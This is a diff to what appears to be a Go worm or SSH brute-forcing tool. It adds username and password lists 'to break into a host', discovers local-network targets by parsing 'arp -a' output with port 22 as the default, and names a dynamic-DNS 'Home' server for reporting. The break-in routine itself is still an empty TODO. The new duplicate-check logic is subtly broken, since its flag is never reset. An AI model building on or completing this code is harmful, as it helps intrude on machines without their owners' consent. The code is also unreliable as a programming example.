@@ -21,6 +21,12 @@ var Payload []byte
 // Targets is an array of Target structs
 var Targets []Target
 
+// Usernames is an array of usernames that can be tried to break into a host
+var Usernames []string
+
+// Passwords is an array of passwords that can be tried to break into a host
+var Passwords []string
+
 // Home is the URL of the server to report statistics to
 var Home = "mweya.duckdns.org"
 
@@ -82,7 +88,6 @@ func FindTargets() {
 	}
 
 	// TODO
-	//if runtime.GOOS == "linux" || runtime.GOOS == "bsd" || runtime.GOOS == "osx" {
 	cmd := exec.Command("arp", "-a")
 	s, err := cmd.CombinedOutput()
 	if err != nil {
@@ -91,6 +96,8 @@ func FindTargets() {
 	}
 	found := ipSyntax.FindAll(s, -1)
 	var j = 0
+	var i = 0
+	var boolDuplicate = false
 	tempTarget := Target{
 		IP:       "",
 		Port:     "22",
@@ -99,11 +106,25 @@ func FindTargets() {
 	}
 	for j < len(found) {
 		tempTarget.IP = string(found[j])
-		Targets = append(Targets, tempTarget)
+
+		// Check to see if target is in the list already
+		// RIP BigO
+		i = 0
+		for i < len(Targets) {
+			if Targets[i].IP == tempTarget.IP {
+				// Drop it
+				boolDuplicate = true
+				// TODO, exploiting didn't work, try another approach?
+			}
+			
+			i = i + 1
+		}
+		if !boolDuplicate {
+			Targets = append(Targets, tempTarget)
+		}
 		j = j + 1
 	}
 
-	//}
 }
 
 // TryTargets attempts to break into the targets
@@ -113,6 +134,8 @@ func TryTargets() {
 	}
 
 	// TODO
+
+	
 
 }
 
